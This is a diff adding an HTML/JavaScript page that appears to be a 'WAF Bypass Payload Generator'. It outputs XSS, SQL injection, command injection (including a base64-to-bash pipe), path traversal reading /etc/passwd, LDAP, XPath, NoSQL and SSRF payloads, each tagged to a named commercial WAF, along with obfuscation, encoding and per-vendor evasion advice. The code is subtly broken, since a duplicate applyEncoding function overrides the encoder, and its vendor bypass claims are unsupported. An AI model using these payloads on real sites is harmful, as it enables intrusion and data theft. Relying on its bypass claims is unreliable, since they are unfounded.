@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>WAF Bypass Payload Generator</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #000;
+      color: #c58b00;
+      overflow-x: hidden;
+    }
+    video#bg-video {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      min-width: 100vw; min-height: 100vh;
+      object-fit: cover;
+      z-index: -2;
+      opacity: 0.25;
+    }
+    audio#bg-music {
+      position: fixed;
+      z-index: -1;
+      opacity: 0;
+      pointer-events: none;
+    }
+    .container {
+      max-width: 900px;
+      margin: 50px auto;
+      padding: 25px;
+      border-radius: 12px;
+      background: rgba(0, 0, 0, 0.2);
+    }
+    h1, label {
+      color: #c58b00;
+      text-shadow: 1px 1px 3px black;
+    }
+    input[type="text"], textarea, select {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background: rgba(0, 0, 0, 0.3);
+      color: #c58b00;
+      border: 1px solid #c58b00;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+    .row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    button {
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid #c58b00;
+      color: #c58b00;
+      padding: 10px 15px;
+      margin: 5px 5px 15px 0;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+    button:hover {
+      background: rgba(255, 255, 255, 0.1);
+      color: red;
+    }
+    pre {
+      white-space: pre-wrap;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 10px;
+      border: 1px solid red;
+      color: #00ffcc;
+      margin: 10px 0;
+      border-radius: 5px;
+      max-height: 340px;
+      overflow-y: auto;
+    }
+    .history { margin-top: 20px; }
+    .history-item {
+      border-bottom: 1px solid red;
+      padding: 5px;
+      font-size: 0.9rem;
+      color: #ff8800;
+    }
+    .hint { font-size: 0.88rem; opacity: 0.9; color: #ffb74d; }
+    @media (max-width: 768px) {
+      .container { margin: 20px 10px; padding: 15px; }
+      .row { grid-template-columns: 1fr; }
+      button { width: 100%; margin: 8px 0; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Background Video -->
+  <video id="bg-video" autoplay muted loop playsinline>
+    <source src="background/1761817527453041720p.mp4" type="video/mp4" />
+    Your browser does not support the video tag.
+  </video>
+  <!-- Background Music -->
+  <audio id="bg-music" loop>
+    <source src="background/Programming___Coding___Hacking_music_vol.18__ANONYMOUS_HEADQUARTERS_(48k).mp3" type="audio/mpeg" />
+    Your browser does not support the audio tag.
+  </audio>
+  <div class="container">
+    <h1>🛡️ WAF Bypass Payload Generator</h1>
+    <label>Attack Type:</label>
+    <select id="attack-type">
+      <option>XSS</option>
+      <option>SQL Injection</option>
+      <option>Command Injection</option>
+      <option>File Inclusion</option>
+      <option>LDAP Injection</option>
+      <option>XPath Injection</option>
+      <option>NoSQL Injection</option>
+      <option>SSRF</option>
+    </select>
+    <div class="row">
+      <div>
+        <label>WAF Type:</label>
+        <select id="waf-type">
+          <option>Generic</option>
+          <option>ModSecurity</option>
+          <option>Cloudflare</option>
+          <option>Imperva</option>
+          <option>F5 ASM</option>
+          <option>Barracuda</option>
+          <option>FortiWeb</option>
+          <option>Akamai</option>
+        </select>
+      </div>
+      <div>
+        <label>Encoding:</label>
+        <select id="encoding">
+          <option>None</option>
+          <option>URL Encode</option>
+          <option>Base64</option>
+          <option>Hex</option>
+          <option>HTML Entity</option>
+          <option>Double URL Encode</option>
+        </select>
+      </div>
+    </div>
+    <label>Target Parameter:</label>
+    <input type="text" id="target" placeholder="e.g., search, id, user" />
+    <label>Custom Command:</label>
+    <textarea id="custom-cmd" rows="3" placeholder='e.g., whoami, cat /etc/passwd'></textarea>
+    <label>Additional Options:</label>
+    <textarea id="options" rows="3" placeholder='e.g., obfuscation level, bypass techniques'></textarea>
+    <div class="row">
+      <button onclick="generatePayload()">Generate Payload</button>
+      <button onclick="analyzePayload()">Analyze Payload</button>
+    </div>
+    <div class="row">
+      <button onclick="obfuscatePayload()">Obfuscate Payload</button>
+      <button onclick="applyEncoding()">Apply Encoding</button>
+    </div>
+    <div class="row">
+      <button onclick="copyResult()">Copy Result</button>
+      <button onclick="clearAll()">Clear</button>
+    </div>
+    <div class="hint">Note: This tool generates WAF bypass payloads for educational purposes only. Use responsibly and only on systems you own or have permission to test.</div>
+    <label>Generated Payload:</label>
+    <pre id="result-box">No payload generated yet...</pre>
+    <div class="history">
+      <h3>History</h3>
+      <div id="history-box"></div>
+    </div>
+  </div>
+  <script>
+    const music = document.getElementById("bg-music");
+    const resultBox = document.getElementById("result-box");
+    const historyBox = document.getElementById("history-box");
+    let history = [];
+    
+    window.addEventListener('click', () => {
+      music.play().catch(() => {});
+    }, { once: true });
+    
+    function generatePayload() {
+      const attackType = document.getElementById("attack-type").value;
+      const wafType = document.getElementById("waf-type").value;
+      const encoding = document.getElementById("encoding").value;
+      const target = document.getElementById("target").value.trim();
+      const customCmd = document.getElementById("custom-cmd").value.trim();
+      const options = document.getElementById("options").value.trim();
+      
+      let payload = "";
+      
+      switch(attackType) {
+        case "XSS":
+          payload = generateXSSPayload(wafType, customCmd, options);
+          break;
+        case "SQL Injection":
+          payload = generateSQLPayload(wafType, customCmd, options);
+          break;
+        case "Command Injection":
+          payload = generateCommandPayload(wafType, customCmd, options);
+          break;
+        case "File Inclusion":
+          payload = generateFileInclusionPayload(wafType, customCmd, options);
+          break;
+        case "LDAP Injection":
+          payload = generateLDAPPayload(wafType, customCmd, options);
+          break;
+        case "XPath Injection":
+          payload = generateXPathPayload(wafType, customCmd, options);
+          break;
+        case "NoSQL Injection":
+          payload = generateNoSQLPayload(wafType, customCmd, options);
+          break;
+        case "SSRF":
+          payload = generateSSRFPayload(wafType, customCmd, options);
+          break;
+      }
+      
+      // Apply encoding if selected
+      if (encoding !== "None") {
+        payload = applyEncoding(payload, encoding);
+      }
+      
+      resultBox.textContent = payload;
+      logHistory(`${attackType} (${wafType})`, `Generated for ${target || "general"}`);
+    }
+    
+    function generateXSSPayload(wafType, customCmd, options) {
+      let payload = "";
+      
+      switch(wafType) {
+        case "Generic":
+          payload = `<img src=x onerror=alert(document.domain)>`;
+          break;
+        case "ModSecurity":
+          payload = `<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">`;
+          break;
+        case "Cloudflare":
+          payload = `<svg/onload=alert(document.domain)>`;
+          break;
+        case "Imperva":
+          payload = `<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))">`;
+          break;
+        case "F5 ASM":
+          payload = `"><script>alert(document.domain)</script>`;
+          break;
+        case "Barracuda":
+          payload = `<img src=x onerror="eval('\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x29')">`;
+          break;
+        case "FortiWeb":
+          payload = `<img src=x onerror="setTimeout('alert(document.domain)',100)">`;
+          break;
+        case "Akamai":
+          payload = `<svg/onload=alert(document.domain)>`;
+          break;
+        default:
+          payload = `<img src=x onerror=alert(document.domain)>`;
+      }
+      
+      if (customCmd) {
+        payload = payload.replace(/alert\(document\.domain\)/g, `alert('${customCmd}')`);
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateXSS(payload);
+      }
+      
+      return payload;
+    }
+    
+    function generateSQLPayload(wafType, customCmd, options) {
+      let payload = "";
+      
+      switch(wafType) {
+        case "Generic":
+          payload = `' OR 1=1--`;
+          break;
+        case "ModSecurity":
+          payload = `' OR SLEEP(10)--`;
+          break;
+        case "Cloudflare":
+          payload = `' UNION SELECT NULL,username,password FROM users--`;
+          break;
+        case "Imperva":
+          payload = `' OR 1 LIKE 1--`;
+          break;
+        case "F5 ASM":
+          payload = `'/**/OR/**/1=1--`;
+          break;
+        case "Barracuda":
+          payload = `' OR 1=1#`;
+          break;
+        case "FortiWeb":
+          payload = `' OR 1=1;--`;
+          break;
+        case "Akamai":
+          payload = `' OR 1=1--`;
+          break;
+        default:
+          payload = `' OR 1=1--`;
+      }
+      
+      if (customCmd) {
+        payload = payload.replace(/1=1/g, `1='${customCmd}'`);
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateSQL(payload);
+      }
+      
+      return payload;
+    }
+    
+    function generateCommandPayload(wafType, customCmd, options) {
+      let payload = "";
+      const command = customCmd || "whoami";
+      
+      switch(wafType) {
+        case "Generic":
+          payload = `; ${command} #`;
+          break;
+        case "ModSecurity":
+          payload = `; echo ${command} | base64 -d | bash #`;
+          break;
+        case "Cloudflare":
+          payload = `; $(echo ${btoa(command)} | base64 -d) #`;
+          break;
+        case "Imperva":
+          payload = `; /bin/bash -c "${command}" #`;
+          break;
+        case "F5 ASM":
+          payload = `| ${command} |`;
+          break;
+        case "Barracuda":
+          payload = `& ${command} &`;
+          break;
+        case "FortiWeb":
+          payload = `; ${command} %00`;
+          break;
+        case "Akamai":
+          payload = `; ${command} #`;
+          break;
+        default:
+          payload = `; ${command} #`;
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateCommand(payload);
+      }
+      
+      return payload;
+    }
+    
+    function generateFileInclusionPayload(wafType, customCmd, options) {
+      let payload = "";
+      const file = customCmd || "/etc/passwd";
+      
+      switch(wafType) {
+        case "Generic":
+          payload = `../../../../..${file}`;
+          break;
+        case "ModSecurity":
+          payload = `....//....//....//....//....//${file}`;
+          break;
+        case "Cloudflare":
+          payload = `/var/www/html/..${file}`;
+          break;
+        case "Imperva":
+          payload = `..%2f..%2f..%2f..%2f..%2f${file}`;
+          break;
+        case "F5 ASM":
+          payload = `/..${file}`;
+          break;
+        case "Barracuda":
+          payload = `/etc/passwd%00`;
+          break;
+        case "FortiWeb":
+          payload = `....//....//....//....//....//${file}%00`;
+          break;
+        case "Akamai":
+          payload = `../../../../..${file}`;
+          break;
+        default:
+          payload = `../../../../..${file}`;
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateFileInclusion(payload);
+      }
+      
+      return payload;
+    }
+    
+    function generateLDAPPayload(wafType, customCmd, options) {
+      let payload = "";
+      
+      switch(wafType) {
+        case "Generic":
+          payload = `*)(uid=*))(|(uid=*))`;
+          break;
+        case "ModSecurity":
+          payload = `*)(uid=*))%00(|(uid=*))`;
+          break;
+        case "Cloudflare":
+          payload = `*)(|(uid=*))`;
+          break;
+        case "Imperva":
+          payload = `*)(uid=*))(|(uid=*))`;
+          break;
+        case "F5 ASM":
+          payload = `*)(uid=*))%00`;
+          break;
+        case "Barracuda":
+          payload = `*)(|(uid=*))`;
+          break;
+        case "FortiWeb":
+          payload = `*)(uid=*))(|(uid=*))`;
+          break;
+        case "Akamai":
+          payload = `*)(uid=*))(|(uid=*))`;
+          break;
+        default:
+          payload = `*)(uid=*))(|(uid=*))`;
+      }
+      
+      if (customCmd) {
+        payload = payload.replace(/uid=\*\)/g, `uid=${customCmd})`);
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateLDAP(payload);
+      }
+      
+      return payload;
+    }
+    
+    function generateXPathPayload(wafType, customCmd, options) {
+      let payload = "";
+      
+      switch(wafType) {
+        case "Generic":
+          payload = `' or '1'='1`;
+          break;
+        case "ModSecurity":
+          payload = `' or '1'='1' or 'a'='a`;
+          break;
+        case "Cloudflare":
+          payload = `' or string-length(name)<1 and '1'='1`;
+          break;
+        case "Imperva":
+          payload = `' or '1'='1`;
+          break;
+        case "F5 ASM":
+          payload = `' or '1'='1`;
+          break;
+        case "Barracuda":
+          payload = `' or '1'='1`;
+          break;
+        case "FortiWeb":
+          payload = `' or '1'='1`;
+          break;
+        case "Akamai":
+          payload = `' or '1'='1`;
+          break;
+        default:
+          payload = `' or '1'='1`;
+      }
+      
+      if (customCmd) {
+        payload = payload.replace(/'1'='1/g, `'${customCmd}'='1`);
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateXPath(payload);
+      }
+      
+      return payload;
+    }
+    
+    function generateNoSQLPayload(wafType, customCmd, options) {
+      let payload = "";
+      
+      switch(wafType) {
+        case "Generic":
+          payload = `{"$ne": null}`;
+          break;
+        case "ModSecurity":
+          payload = `{"$where": "sleep(1000)"}`;
+          break;
+        case "Cloudflare":
+          payload = `{"$gt": ""}`;
+          break;
+        case "Imperva":
+          payload = `{"$ne": null}`;
+          break;
+        case "F5 ASM":
+          payload = `{"$ne": null}`;
+          break;
+        case "Barracuda":
+          payload = `{"$ne": null}`;
+          break;
+        case "FortiWeb":
+          payload = `{"$ne": null}`;
+          break;
+        case "Akamai":
+          payload = `{"$ne": null}`;
+          break;
+        default:
+          payload = `{"$ne": null}`;
+      }
+      
+      if (customCmd) {
+        payload = payload.replace(/null/g, `"${customCmd}"`);
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateNoSQL(payload);
+      }
+      
+      return payload;
+    }
+    
+    function generateSSRFPayload(wafType, customCmd, options) {
+      let payload = "";
+      const url = customCmd || "http://127.0.0.1:80";
+      
+      switch(wafType) {
+        case "Generic":
+          payload = `http://127.0.0.1:80@${url}`;
+          break;
+        case "ModSecurity":
+          payload = `http://127.0.0.1:80%23@${url}`;
+          break;
+        case "Cloudflare":
+          payload = `http://127.0.0.1:80?${url}`;
+          break;
+        case "Imperva":
+          payload = `http://127.0.0.1:80@${url}`;
+          break;
+        case "F5 ASM":
+          payload = `http://127.0.0.1:80@${url}`;
+          break;
+        case "Barracuda":
+          payload = `http://127.0.0.1:80@${url}`;
+          break;
+        case "FortiWeb":
+          payload = `http://127.0.0.1:80@${url}`;
+          break;
+        case "Akamai":
+          payload = `http://127.0.0.1:80@${url}`;
+          break;
+        default:
+          payload = `http://127.0.0.1:80@${url}`;
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateSSRF(payload);
+      }
+      
+      return payload;
+    }
+    
+    function applyEncoding(payload, encoding) {
+      switch(encoding) {
+        case "URL Encode":
+          return encodeURIComponent(payload);
+        case "Base64":
+          return btoa(payload);
+        case "Hex":
+          return Array.from(payload)
+            .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
+            .join('\\x');
+        case "HTML Entity":
+          return payload.replace(/./g, c => `&#${c.charCodeAt(0)};`);
+        case "Double URL Encode":
+          return encodeURIComponent(encodeURIComponent(payload));
+        default:
+          return payload;
+      }
+    }
+    
+    function obfuscatePayload() {
+      const payload = resultBox.textContent;
+      if (!payload || payload === "No payload generated yet...") {
+        resultBox.textContent = "❌ No payload to obfuscate. Generate payload first.";
+        return;
+      }
+      
+      const attackType = document.getElementById("attack-type").value;
+      let obfuscated = "";
+      
+      switch(attackType) {
+        case "XSS":
+          obfuscated = obfuscateXSS(payload);
+          break;
+        case "SQL Injection":
+          obfuscated = obfuscateSQL(payload);
+          break;
+        case "Command Injection":
+          obfuscated = obfuscateCommand(payload);
+          break;
+        case "File Inclusion":
+          obfuscated = obfuscateFileInclusion(payload);
+          break;
+        case "LDAP Injection":
+          obfuscated = obfuscateLDAP(payload);
+          break;
+        case "XPath Injection":
+          obfuscated = obfuscateXPath(payload);
+          break;
+        case "NoSQL Injection":
+          obfuscated = obfuscateNoSQL(payload);
+          break;
+        case "SSRF":
+          obfuscated = obfuscateSSRF(payload);
+          break;
+      }
+      
+      resultBox.textContent = obfuscated;
+      logHistory("Obfuscation", "Applied successfully");
+    }
+    
+    function obfuscateXSS(payload) {
+      // Simple XSS obfuscation by splitting strings and using eval
+      return `eval(String.fromCharCode(${payload.split('').map(c => c.charCodeAt(0)).join(',')}))`;
+    }
+    
+    function obfuscateSQL(payload) {
+      // Simple SQL obfuscation by using comments and case variation
+      return payload.replace(/OR/g, 'oR').replace(/--/g, '-- /* comment */');
+    }
+    
+    function obfuscateCommand(payload) {
+      // Simple command obfuscation by using variables
+      return `a=${payload.split(' ')[0]};b=${payload.split(' ')[1]};$a $b`;
+    }
+    
+    function obfuscateFileInclusion(payload) {
+      // Simple file inclusion obfuscation by using environment variables
+      return payload.replace(/\.\.\//g, '${PWD}/../');
+    }
+    
+    function obfuscateLDAP(payload) {
+      // Simple LDAP obfuscation by using whitespace
+      return payload.replace(/\*/g, ' * ');
+    }
+    
+    function obfuscateXPath(payload) {
+      // Simple XPath obfuscation by using concatenation
+      return payload.replace(/'/g, '"\'"');
+    }
+    
+    function obfuscateNoSQL(payload) {
+      // Simple NoSQL obfuscation by using alternative syntax
+      return payload.replace(/\$ne/g, '$notEqual');
+    }
+    
+    function obfuscateSSRF(payload) {
+      // Simple SSRF obfuscation by using URL encoding
+      return payload.replace(/http:\/\//g, 'h%74tp://');
+    }
+    
+    function applyEncoding() {
+      const payload = resultBox.textContent;
+      if (!payload || payload === "No payload generated yet...") {
+        resultBox.textContent = "❌ No payload to encode. Generate payload first.";
+        return;
+      }
+      
+      const encoding = document.getElementById("encoding").value;
+      if (encoding === "None") {
+        resultBox.textContent = "❌ Please select an encoding first.";
+        return;
+      }
+      
+      const encoded = applyEncoding(payload, encoding);
+      resultBox.textContent = encoded;
+      logHistory("Encoding", `Applied ${encoding} encoding`);
+    }
+    
+    function analyzePayload() {
+      const payload = resultBox.textContent;
+      if (!payload || payload === "No payload generated yet...") {
+        resultBox.textContent = "❌ No payload to analyze. Generate payload first.";
+        return;
+      }
+      
+      const attackType = document.getElementById("attack-type").value;
+      const wafType = document.getElementById("waf-type").value;
+      let analysis = {
+        type: attackType,
+        waf: wafType,
+        length: payload.length,
+        special_chars: (payload.match(/[^a-zA-Z0-9\s]/g) || []).length,
+        encoding_detected: detectEncoding(payload),
+        potential_bypasses: [],
+        context_advice: ""
+      };
+      
+      // Detect encoding
+      function detectEncoding(p) {
+        if (/^[\w\d=\/+]+$/.test(p) && p.length % 4 === 0) return "Base64";
+        if (/%[0-9A-Fa-f]{2}/.test(p)) return "URL";
+        if (/\\x[0-9A-Fa-f]{2}/.test(p)) return "Hex";
+        if (/&#\d+;/.test(p)) return "HTML Entity";
+        return "None";
+      }
+      
+      // Detect potential bypasses
+      if (payload.includes("'") && payload.includes('"')) {
+        analysis.potential_bypasses.push("Mixed quotes to break out of different contexts");
+      }
+      if (payload.includes("/*") || payload.includes("--")) {
+        analysis.potential_bypasses.push("Comments to break query structure");
+      }
+      if (payload.includes("$") || payload.includes("{")) {
+        analysis.potential_bypasses.push("Variable substitution");
+      }
+      
+      // Context advice based on WAF type
+      switch(wafType) {
+        case "ModSecurity":
+          analysis.context_advice = "Try using comments, case variation, or alternative syntax";
+          break;
+        case "Cloudflare":
+          analysis.context_advice = "Try using alternative event handlers or SVG tags";
+          break;
+        case "Imperva":
+          analysis.context_advice = "Try using encoding or alternative syntax";
+          break;
+        case "F5 ASM":
+          analysis.context_advice = "Try using comments or alternative delimiters";
+          break;
+        case "Barracuda":
+          analysis.context_advice = "Try using null bytes or alternative syntax";
+          break;
+        case "FortiWeb":
+          analysis.context_advice = "Try using null bytes or double encoding";
+          break;
+        case "Akamai":
+          analysis.context_advice = "Try using alternative tags or event handlers";
+          break;
+        default:
+          analysis.context_advice = "Try using obfuscation or encoding";
+      }
+      
+      resultBox.textContent = JSON.stringify(analysis, null, 2);
+      logHistory("Analysis", `Completed for ${attackType} against ${wafType}`);
+    }
+    
+    function copyResult() {
+      const text = resultBox.textContent;
+      if (!text || text === "No payload generated yet...") return alert("Nothing to copy!");
+      navigator.clipboard.writeText(text).then(() => alert("Payload copied!"));
+    }
+    
+    function clearAll() {
+      document.getElementById("attack-type").value = "XSS";
+      document.getElementById("waf-type").value = "Generic";
+      document.getElementById("encoding").value = "None";
+      document.getElementById("target").value = "";
+      document.getElementById("custom-cmd").value = "";
+      document.getElementById("options").value = "";
+      resultBox.textContent = "No payload generated yet...";
+    }
+    
+    function logHistory(target, snippet) {
+      const time = new Date().toLocaleTimeString();
+      const line = `${time} - ${target}: ${snippet}`;
+      history.unshift(line);
+      updateHistory();
+    }
+    
+    function updateHistory() {
+      historyBox.innerHTML = "";
+      history.slice(0, 8).forEach(entry => {
+        const div = document.createElement("div");
+        div.className = "history-item";
+        div.textContent = entry;
+        historyBox.appendChild(div);
+      });
+    }
+  </script>
+</body>
+</html>
